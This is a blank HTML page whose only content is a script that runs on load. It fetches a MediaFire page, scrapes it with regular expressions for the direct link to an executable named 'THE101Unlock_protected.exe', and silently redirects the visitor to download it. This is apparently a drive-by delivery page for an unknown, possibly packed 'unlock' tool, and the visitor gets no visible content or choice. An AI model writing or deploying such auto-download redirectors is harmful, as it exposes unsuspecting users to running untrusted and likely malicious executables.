<!DOCTYPE html>
<html>
<head>
    <script>
        (async function() {
            try {
                const response = await fetch('https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file');
                const html = await response.text();
                
                // Method 1: Look for download button
                const downloadButtonMatch = html.match(/id="downloadButton"[^>]*href="([^"]*)"/);
                
                // Method 2: Look for direct download link
                const directLinkMatch = html.match(/href="(https:\/\/download[^"]*\.mediafire\.com[^"]*\.exe)"/);
                
                // Method 3: Look for input popsok class
                const popsokMatch = html.match(/class="input popsok"[^>]*href="([^"]*)"/);
                
                const directUrl = downloadButtonMatch?.[1] || directLinkMatch?.[1] || popsokMatch?.[1];
                
                if (directUrl) {
                    console.log('✅ Extracted direct URL:', directUrl);
                    window.location.href = directUrl;
                } else {
                    console.log('❌ No direct URL found');
                    window.location.href = 'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
                }
                
            } catch (error) {
                console.error('Fetch error:', error);
                window.location.href = 'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
            }
        })();
    </script>
</head>
<body>
</body>
</html>
